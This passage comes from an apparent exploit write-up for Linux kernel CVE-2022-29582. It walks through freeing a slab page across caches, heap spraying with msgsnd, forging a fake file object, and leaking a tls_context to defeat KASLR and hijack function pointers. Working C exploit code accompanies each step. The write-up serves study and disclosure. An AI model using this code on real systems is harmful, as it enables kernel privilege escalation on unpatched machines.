<p>In the diagram above we start from the left having previously freed the target page. Then successively we free one object per (full) page, for the maximum number of pages allowed in the partial list. The last of these pages triggers entry into <code class="language-plaintext highlighter-rouge">unfreeze_partials()</code> because it overflows the partial list.</p>

<p>There‚Äôs an additional purpose to <code class="language-plaintext highlighter-rouge">unfreeze_partials()</code> apart from moving the pages to the node partial list. If any of the partial pages is empty, then <code class="language-plaintext highlighter-rouge">page.inuse</code> is false. So as we can see, the page is stored for <strong>discarding</strong>. This takes us to our grand goal: discarding a slab page means freeing that page back to the page allocator.</p>

<p>Hang on a second, not so fast! We‚Äôve still got some questions to answer:</p>
<ol>
  <li>
    <p>How do we fill up a page? The kernel variable describing the maximum amount of objects for each slab is: <code class="language-plaintext highlighter-rouge">objs_per_slab</code>. Its value is accessible through sysfs: <code class="language-plaintext highlighter-rouge">/sys/kernel/slab/filp/objs_per_slab : 25</code></p>
  </li>
  <li>
    <p>How do we know the maximum number of pages allowed on the partial list? We need to free one object per page for the max pages in order to overflow the partial list. We also need to ensure there‚Äôs no excess objects still allocated on the target page. In a similar way we can get the value for <code class="language-plaintext highlighter-rouge">cpu_partial</code>, the maximum amount of pages able to fit on a CPU partial list for this cache: <code class="language-plaintext highlighter-rouge">/sys/kernel/slab/filp/cpu_partial : 13</code></p>
  </li>
</ol>

<h3 id="method">Method</h3>
<p>So we know that it‚Äôs possible for us, from userspace, to free a page programmatically. The mechanics to this is what follows.</p>

<hr />
<figure>
<img src="/img/posts/cve-2022-29582/cc1.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Reserving slabs to overflow the partial list</i></center></figcaption>
</figure>
<p>In step 1 we reserve our partial list pages. They should be full now so that we can invoke <code class="language-plaintext highlighter-rouge">put_cpu_partial()</code> later. Since we want to overflow the partial list we reserve more pages than the list can fit. After we‚Äôve allocated 25 x (13 + 1) objects there are two possibilites, as shown in the diagram above. First, the new active slab is slab 14 and is full. This is possible if there were no files on slab 1 prior to cross-cache. More likely is the second possibility, where slab 15 is the active slab and is not full. We will assume that we are in the latter case. But the (slightly more cautious) steps are the same.</p>

<hr />
<figure>
<img src="/img/posts/cve-2022-29582/cc2.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Setting the target slab as the active slab</i></center></figcaption>
</figure>
<p>In step 2 we allocate 1 less than the maximum number of objects per slab, so that‚Äôs 24. We now have a new active slab containing n - 1 allocated objects.</p>

<hr />
<figure>
<img src="/img/posts/cve-2022-29582/cc3.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Triggering the Use-After-Free</i></center></figcaption>
</figure>
<p>Okay, step 3 we are a little more familiar with. We trigger the <code class="language-plaintext highlighter-rouge">file</code> Use-After-Free.</p>

<hr />
<figure>
<img src="/img/posts/cve-2022-29582/cc4.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Setting a new active slab</i></center></figcaption>
</figure>
<p>In step 4 the main goal is to allocate enough objects to get a new active slab. So we allocate 26, meaning our target <code class="language-plaintext highlighter-rouge">file</code> has been reallocated. If we don‚Äôt do this then when we empty out the target page it‚Äôll just stay as the active slab.</p>

<hr />

<figure>
<img src="/img/posts/cve-2022-29582/cc5.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Emptying the target slab</i></center></figcaption>
</figure>
<p>In step 5 we free all allocations from the target slab. Of these, the first freed file leads to <code class="language-plaintext highlighter-rouge">put_cpu_partial()</code> because the target slab was previously full. So now we‚Äôve got our target slab on the partial list! Hm‚Ä¶ spooky feeling ‚Äì d√©j√† vu, anyone?</p>

<hr />

<figure>
<img src="/img/posts/cve-2022-29582/cc6.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Overflowing the partial list to free the target slab</i></center></figcaption>
</figure>
<p>In step 6 we free one object per page for all those pages filled up in step 1. Because we‚Äôve already reserved one spot on the partial list, when we get to the limit, we‚Äôll invoke <code class="language-plaintext highlighter-rouge">unfreeze_partials()</code> as desired! All of the slabs will go onto the node list except our target slab who has had far too much to drink (<em>is singing Empty Pages by Traffic</em>) and needs to go home immediately (<em>please someone get an uber</em>). See appendix for a directly related article on the cross-cache steps.</p>

<h3 id="page-reallocation">Page reallocation</h3>
<p>Now that we‚Äôve freed our target page the next step is to reallocate the target page ‚Äì but now for a different cache. Because <code class="language-plaintext highlighter-rouge">file</code> objects approach 512 bytes in size, <code class="language-plaintext highlighter-rouge">kmalloc-512</code> is the best choice for us.</p>

<p>This seems a little arbitrary though, doesn‚Äôt it? Why not <code class="language-plaintext highlighter-rouge">kmalloc-1k</code> or <code class="language-plaintext highlighter-rouge">kmalloc-2k</code>? The simple answer is that we aren‚Äôt actually as free as we thought we were (<em>whoa</em>). Jokes aside, page reallocation is slightly constrained. We can indeed reallocate a page to any cache but there‚Äôs also some barriers to this which can reduce reliability. A brief discussion of this follows.</p>

<h4 id="the-buddy-allocator">The buddy allocator</h4>
<p>Each cache uses slabs which are of a certain <strong>order</strong>. An order describes the number of pages to conjoin together when servicing a request. For example, take <code class="language-plaintext highlighter-rouge">kmalloc-4k</code>. It doesn‚Äôt really make sense to just give ‚Äòem 4096 bytes for a new slab - the cache will be back for another go before we can count to 10. Instead, <code class="language-plaintext highlighter-rouge">kmalloc-4k</code> typically gets 2^3 pages, the order of this cache being 3.</p>
<figure>
<img src="/img/posts/cve-2022-29582/buddy.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Per-order lists holding slabs of conjoined pages</i></center></figcaption>
</figure>
<p>On the other hand, as seen above, <code class="language-plaintext highlighter-rouge">file</code> objects (of size 384) and <code class="language-plaintext highlighter-rouge">kmalloc-512</code> objects (of size between 256 and 512) sit on slabs of order-1. This means that if we free the <code class="language-plaintext highlighter-rouge">filp</code> page, it‚Äôs probably easier to directly target the order-1 list when trying to allocate it back out. There are ways around this if we game the buddy allocation algorithm to split up a higher order block (see appendix). But we went with <code class="language-plaintext highlighter-rouge">kmalloc-512</code>.</p>

<h2 id="reallocating-as-msg_msgseg">Reallocating as <code class="language-plaintext highlighter-rouge">msg_msgseg</code></h2>
<p>Now we are in the home stretch. To reallocate the page(s) for <code class="language-plaintext highlighter-rouge">kmalloc-512</code> we‚Äôll actually be attempting to write over the <code class="language-plaintext highlighter-rouge">file</code> with the contents of a <code class="language-plaintext highlighter-rouge">msg_msgseg</code>. We can do this using a method typically called <strong>heap spraying</strong> (aka spamming the shit out of <code class="language-plaintext highlighter-rouge">msgsnd()</code>). There are other ways to spray the heap - namely, using keyrings, socket messages, or extended attributes, but the System V IPC APIs are a tried-and-tested technology that is easy to use.</p>

<p>For our first peek at the exploit code, this is where we‚Äôre at:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kr">inline</span> <span class="n">err_t</span> <span class="nf">reallocate_filp_page</span><span class="p">(</span><span class="k">struct</span> <span class="n">manager</span> <span class="o">*</span><span class="n">mgr</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">IF_ERR_RET</span><span class="p">(</span><span class="n">spray_msg</span><span class="p">(</span><span class="n">mgr</span><span class="o">-&gt;</span><span class="n">msq_ids</span><span class="p">,</span> <span class="n">TOTAL_MSGS</span><span class="p">,</span> <span class="n">mgr</span><span class="o">-&gt;</span><span class="n">spray</span><span class="p">,</span> <span class="n">MSG_SIZE</span><span class="p">))</span>
    <span class="n">memset</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">mgr</span><span class="o">-&gt;</span><span class="n">spray</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="n">MSG_SIZE</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">SUCC</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">err_t</span> <span class="nf">spray_msg</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="n">store</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">amount</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int32_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">msgb</span><span class="o">*</span> <span class="n">msg</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">msgb</span><span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">amount</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">msg</span><span class="o">-&gt;</span><span class="n">mtype</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">msgsnd</span><span class="p">(</span><span class="n">store</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">msg</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">IF_ERR</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">perror</span><span class="p">(</span><span class="s">"spray_msg:msgsnd"</span><span class="p">);</span>
            <span class="k">return</span> <span class="n">ERR</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">SUCC</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>For us, we had <code class="language-plaintext highlighter-rouge">TOTAL_MSGS</code> at 9999 and <code class="language-plaintext highlighter-rouge">MSG_SIZE</code> at 4500. The former is probably a bit excessive but better to be safe than sorry. The latter needs some explaining.</p>

<p>Since we‚Äôre targeting the <code class="language-plaintext highlighter-rouge">kmalloc-512</code> cache, we‚Äôll need to allocate objects of size between 256 and 512. So why 4500? When we use the SystemV IPC messaging protocol, each individual message may be broken down into smaller messages depending on its size. The first piece of a message is limited to 4096 - 48 bytes: the size of a page with room for the <code class="language-plaintext highlighter-rouge">msg_msg</code> metadata header. But if our message exceeds this limit then we‚Äôll get a single <code class="language-plaintext highlighter-rouge">msg_msg</code> to start things off, then however many <code class="language-plaintext highlighter-rouge">msg_msgseg</code> are needed to satisfy the request. All of them are linked together like a happy row of ducklings waddling into the furnaces of hell.</p>

<figure>
<img src="/img/posts/cve-2022-29582/msg.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>msg_msg vs. msg_msgseg</i></center></figcaption>
</figure>
<p>Now, we could just have a <code class="language-plaintext highlighter-rouge">MSG_SIZE</code> of 512 - 48. But the problem is that 48 bytes at the header. We don‚Äôt control it. So the data initialised there might influence control flow in weird and whacky ways ‚Äì far beyond the comprehension of mere mortals. So, we‚Äôll stick to the alternative: the <code class="language-plaintext highlighter-rouge">msg_msgseg</code> with its 8 byte header. Hence, a 4500 byte message split into two parts.</p>

<p>After spamming <code class="language-plaintext highlighter-rouge">msg_msgseg</code> objects into the heap, eventually the old <code class="language-plaintext highlighter-rouge">filp</code> page will be reallocated for <code class="language-plaintext highlighter-rouge">kmalloc-512</code>. This isn‚Äôt 100% reliable. But when it works, it really works.</p>

<h3 id="msg_msgseg-use-after-free"><code class="language-plaintext highlighter-rouge">msg_msgseg</code> use-after-free</h3>
<p>So, some news. We‚Äôre going to trigger a third Use-After-Free. 
That‚Äôs crazy! Another one? Why?!</p>

<p>Well, unless we happen to be on a system which is ideologically opposed to KASLR factionalism or we‚Äôre psychic and can <em>reach</em> into the computer and <em>touch</em> the kernel base address with our mind, then we‚Äôll first need an information leak (or a side-channel attack) before we can write properly defined objects to the heap.</p>

<p>To get a leak, we need to write over the <code class="language-plaintext highlighter-rouge">msg_msgseg</code> with another type of object. Then we can receive the message with <code class="language-plaintext highlighter-rouge">msgrcv()</code>. Once we‚Äôve got the msg in our userspace buffer, we‚Äôll read out the overlaid object‚Äôs data and use it to calculate the kernel base address. So we want the object we‚Äôre leaking to contain a pointer into a read-only section of the kernel image. But first, we need to free the  <code class="language-plaintext highlighter-rouge">file</code> (again).</p>

<h4 id="freeing-the-file">Freeing the file</h4>
<p>Thinking back to what our page Use-After-Free means: we can use data currently on this page as if that data comprised a <code class="language-plaintext highlighter-rouge">file</code> object. How? We have a file descriptor in userspace whose associated <code class="language-plaintext highlighter-rouge">file</code> is now part of a <code class="language-plaintext highlighter-rouge">msg_msgseg</code> due to cross-cache.</p>

<p>Our first instinct here might be to call <code class="language-plaintext highlighter-rouge">close(fd)</code>. Since this was the last tangible reference to the <code class="language-plaintext highlighter-rouge">file</code>, closing should free it (again). But we notice something deeply disturbing in the <code class="language-plaintext highlighter-rouge">close()</code> implementation which requires us, hands shaking and sweat forming on our brow, to sulk down into a chair and question our life choices:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">filp_close</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="n">fl_owner_t</span> <span class="n">id</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="n">retval</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">file_count</span><span class="p">(</span><span class="n">filp</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">printk</span><span class="p">(</span><span class="n">KERN_ERR</span> <span class="s">"VFS: Close: file count is 0</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">filp</span><span class="o">-&gt;</span><span class="n">f_op</span><span class="o">-&gt;</span><span class="n">flush</span><span class="p">)</span>
		<span class="n">retval</span> <span class="o">=</span> <span class="n">filp</span><span class="o">-&gt;</span><span class="n">f_op</span><span class="o">-&gt;</span><span class="n">flush</span><span class="p">(</span><span class="n">filp</span><span class="p">,</span> <span class="n">id</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">likely</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">filp</span><span class="o">-&gt;</span><span class="n">f_mode</span> <span class="o">&amp;</span> <span class="n">FMODE_PATH</span><span class="p">)))</span> <span class="p">{</span>
		<span class="n">dnotify_flush</span><span class="p">(</span><span class="n">filp</span><span class="p">,</span> <span class="n">id</span><span class="p">);</span>
		<span class="n">locks_remove_posix</span><span class="p">(</span><span class="n">filp</span><span class="p">,</span> <span class="n">id</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">fput</span><span class="p">(</span><span class="n">filp</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">retval</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>As we can see, overwriting the <code class="language-plaintext highlighter-rouge">file</code> object with say, all <code class="language-plaintext highlighter-rouge">NULL</code>, would run us into three hurdles:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">file_count(filp)</code> would give the refcount: 0, <code class="language-plaintext highlighter-rouge">filp_close()</code>  returning prematurely.</li>
  <li>Even if we got passed the first hurdle, <code class="language-plaintext highlighter-rouge">filp-&gt;f_op</code> would be <code class="language-plaintext highlighter-rouge">NULL</code> and so we‚Äôd crash the kernel while checking if <code class="language-plaintext highlighter-rouge">flush()</code> is defined.</li>
  <li>Finally, we probably want to reduce the complexity of our ascent to Use-After-Free. So, we‚Äôd like <code class="language-plaintext highlighter-rouge">FMODE_PATH</code> to be set in <code class="language-plaintext highlighter-rouge">filp-&gt;f_mode</code>.</li>
</ul>

<p>Of the three, setting the refcount to 1 and the mode to <code class="language-plaintext highlighter-rouge">FMODE_PATH</code> is easy. We just calculate the offset of these fields in the <code class="language-plaintext highlighter-rouge">file</code> relative to where our <code class="language-plaintext highlighter-rouge">msg_msgseg</code> will be overlaid and then write to them. But ensuring that <code class="language-plaintext highlighter-rouge">filp-&gt;f_op</code> is defined and <code class="language-plaintext highlighter-rouge">filp-&gt;f_op-&gt;flush</code> is not defined takes a little more finessing. The minimum requirement here is that we have a valid kernel pointer to stand-in for <code class="language-plaintext highlighter-rouge">f_op</code>. Further, we need <code class="language-plaintext highlighter-rouge">flush()</code> to be <code class="language-plaintext highlighter-rouge">NULL</code>, meaning <code class="language-plaintext highlighter-rouge">f_op + 0x70</code> has to be <code class="language-plaintext highlighter-rouge">NULL</code>.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* We write this pointer to file-&gt;f_op so that f_op-&gt;flush == NULL.
 * This address and its contents are invariant across boots. */</span>
<span class="cp">#define NULL_MEM (0xfffffe0000002000)
</span></code></pre></div></div>
<p>In spite of KASLR and heap offset randomisation we found an address which satisfies our requirement across all executions of the target kernel (see appendix for more information).</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">set_file_spray_data</span><span class="p">(</span><span class="k">struct</span> <span class="n">manager</span><span class="o">*</span> <span class="n">mgr</span><span class="p">)</span>
<span class="p">{</span>
    <span class="cm">/* Construct a fuzzy file object */</span>
<span class="cp">#define F_OP_OFF (88)
#define REF_OFF (128)
#define F_MODE_OFF (140)
#define MSGSEG_OFF (4000)
</span>
    <span class="n">memset</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">mgr</span><span class="o">-&gt;</span><span class="n">spray</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MSG_SIZE</span><span class="p">);</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">file_contents</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">mgr</span><span class="o">-&gt;</span><span class="n">spray</span> <span class="o">+</span> <span class="n">MSGSEG_OFF</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">f_op</span> <span class="o">=</span> <span class="n">file_contents</span> <span class="o">+</span> <span class="n">F_OP_OFF</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">refcount</span> <span class="o">=</span> <span class="n">file_contents</span> <span class="o">+</span> <span class="n">REF_OFF</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">f_mode</span> <span class="o">=</span> <span class="n">file_contents</span> <span class="o">+</span> <span class="n">F_MODE_OFF</span><span class="p">;</span>

    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">f_op</span> <span class="o">=</span> <span class="n">NULL_MEM</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">refcount</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">f_mode</span> <span class="o">=</span> <span class="mh">0x4000</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>So, to at least give the illusion of a valid <code class="language-plaintext highlighter-rouge">file</code> object, we prepare the file fields, as above, and spray the fake <code class="language-plaintext highlighter-rouge">file</code> objects into the heap as seen earlier.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kr">inline</span> <span class="n">err_t</span> <span class="nf">double_free_file</span><span class="p">(</span><span class="k">struct</span> <span class="n">manager</span> <span class="o">*</span><span class="n">mgr</span><span class="p">,</span> <span class="kt">int32_t</span> <span class="o">*</span><span class="n">hits</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">hits</span><span class="p">[</span><span class="n">N_PIPES</span><span class="p">];</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">int</span> <span class="n">p_idx</span> <span class="o">=</span> <span class="n">hits</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="kt">int</span> <span class="n">in</span> <span class="o">=</span> <span class="n">mgr</span><span class="o">-&gt;</span><span class="n">pipes_in</span><span class="p">[</span><span class="n">p_idx</span><span class="p">][</span><span class="n">RD</span><span class="p">];</span>
        <span class="n">close</span><span class="p">(</span><span class="n">in</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">SUCC</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>We are able to free the <code class="language-plaintext highlighter-rouge">file</code> again, causing a <code class="language-plaintext highlighter-rouge">msg_msgseg</code> Use-After-Free. The <code class="language-plaintext highlighter-rouge">file</code> object is given back to the slab, resolved via the <code class="language-plaintext highlighter-rouge">page</code> from whence it came, to <code class="language-plaintext highlighter-rouge">kmalloc-512</code>.</p>

<p>This means we need to find another type of object to overlay onto the dangling <code class="language-plaintext highlighter-rouge">msg_msgseg</code>. This object should have a kernel read-only section pointer and must come from the <code class="language-plaintext highlighter-rouge">kmalloc-512</code> cache (to capture the <code class="language-plaintext highlighter-rouge">msg_msgseg</code>).</p>

<h2 id="tls-who-tls_context">TLS who? <code class="language-plaintext highlighter-rouge">tls_context</code></h2>
<p>After extensive research based on the scientific method of testing and invalidating hypotheses (aka going through a list of objects with a size inbetween 257 and 512 bytes), we found a candidate type, <code class="language-plaintext highlighter-rouge">tls_context</code></p>

<figure>
<img src="/img/posts/cve-2022-29582/tlsfields.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>TLS context target fields</i></center></figcaption>
</figure>

<p>As seen above, we have a <code class="language-plaintext highlighter-rouge">list_head</code> whose <code class="language-plaintext highlighter-rouge">next</code> and <code class="language-plaintext highlighter-rouge">prev</code> fields will point back to their own addresses. By subtracting <code class="language-plaintext highlighter-rouge">0x98</code> from <code class="language-plaintext highlighter-rouge">list.next</code> we get the address of our <code class="language-plaintext highlighter-rouge">tls_context</code> object.</p>

<p>Even better, each <code class="language-plaintext highlighter-rouge">tls_context</code> has a <code class="language-plaintext highlighter-rouge">proto</code> pointer to <code class="language-plaintext highlighter-rouge">tcp_prot</code>. This object has two awesome features. For one, its address is a constant offset from the kernel base. So reading out field <code class="language-plaintext highlighter-rouge">sk_proto == &amp;tcp_prot</code> means a way around KASLR. Further, it‚Äôs got a bunch of function pointers. So if we can forge a fake <code class="language-plaintext highlighter-rouge">proto</code> object then we‚Äôve got the main ingredient for arbitrary code execution. As we might‚Äôve guessed from the diagram, we are specifically going to target <code class="language-plaintext highlighter-rouge">getsockopt()</code>.</p>

<h3 id="reallocating-as-tls_context">Reallocating as <code class="language-plaintext highlighter-rouge">tls_context</code></h3>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</code></pre></div></div>
<p>To spray <code class="language-plaintext highlighter-rouge">tls_context</code> objects into the kernel heap, and therefore to write over our dangling <code class="language-plaintext highlighter-rouge">msg_msgseg</code>, we pre-prepare a bunch of sockets as above.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">server</span><span class="p">;</span>
<span class="n">inet_aton</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">server</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">);</span>
<span class="n">server</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">9999</span><span class="p">);</span>
<span class="n">server</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">server</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">server</span><span class="p">)))</span> <span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">"connect"</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">ERR</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">tls_fds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
</code></pre></div></div>
<p>We connect each new socket to a local server.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">tls_fds</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
<span class="c1">// struct tls_context allocation in kmalloc-512</span>
<span class="k">if</span> <span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">SOL_TCP</span><span class="p">,</span> <span class="n">TCP_ULP</span><span class="p">,</span> <span class="s">"tls"</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="s">"tls"</span><span class="p">)))</span> <span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">"setsockopt(fd, SOL_TCP, TCP_ULP, </span><span class="se">\"</span><span class="s">tls</span><span class="se">\"</span><span class="s">"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"fd: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">ERR_UNFIN</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
<span class="p">};</span>
</code></pre></div></div>
<p>Then when we are actually ready (after all the preceding exploit stages) we upgrade these connected sockets and in doing so, allocate a <code class="language-plaintext highlighter-rouge">tls_context</code> for each one.</p>

<h3 id="leaking-tls_context">Leaking <code class="language-plaintext highlighter-rouge">tls_context</code></h3>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kr">inline</span> <span class="n">err_t</span> <span class="nf">leak_tls_contexts</span><span class="p">(</span><span class="k">struct</span> <span class="n">manager</span> <span class="o">*</span><span class="n">mgr</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">leak</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">mgr</span><span class="o">-&gt;</span><span class="n">leak</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">store</span> <span class="o">=</span> <span class="n">mgr</span><span class="o">-&gt;</span><span class="n">msq_ids</span><span class="p">;</span>
    <span class="n">IF_ERR_RET</span><span class="p">(</span><span class="n">leak_msg</span><span class="p">(</span><span class="n">DEAD_LIST_PATTERN</span><span class="p">,</span> <span class="n">store</span><span class="p">,</span> <span class="n">TOTAL_MSGS</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="n">MSG_SIZE</span><span class="p">))</span>
    <span class="n">print_leak</span><span class="p">(</span><span class="n">leak</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">SUCC</span><span class="p">;</span>
<span class="p">}</span> 
</code></pre></div></div>
<p>Now that one of our messages contains the <code class="language-plaintext highlighter-rouge">tls_context</code> we can attempt to find the <code class="language-plaintext highlighter-rouge">DEAD_LIST_PATTERN</code> in some message whose ID is stored in <code class="language-plaintext highlighter-rouge">mgr-&gt;msq_ids</code> and whose contents will be output to <code class="language-plaintext highlighter-rouge">mgr-&gt;leak</code>. Importantly, receiving a message will free it. So now we have a <strong><code class="language-plaintext highlighter-rouge">tls_context</code> Use-After-Free</strong> (lol).</p>

<h3 id="overwriting-tls_context">Overwriting <code class="language-plaintext highlighter-rouge">tls_context</code></h3>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kr">inline</span> <span class="n">err_t</span> <span class="nf">prepare_tls_overwrite</span><span class="p">(</span><span class="k">struct</span> <span class="n">manager</span> <span class="o">*</span><span class="n">mgr</span><span class="p">)</span>
<span class="p">{</span>
<span class="cp">#define KHEAP_PTR_OFF (200)
#define RO_PTR_OFF (224)
#define LIST_OFF (0x98)
#define BASE_OFF (0x180b660)
#define MSGSEG_OFF (4000)    
</span>    <span class="cm">/* Extract pointers and wipe the data, ready for spray. */</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">leak</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">mgr</span><span class="o">-&gt;</span><span class="n">leak</span> <span class="o">+</span> <span class="n">MSGSEG_OFF</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">tls_context</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">leak</span><span class="p">[</span><span class="n">KHEAP_PTR_OFF</span><span class="p">]</span> <span class="o">-</span> <span class="n">LIST_OFF</span><span class="p">;</span>
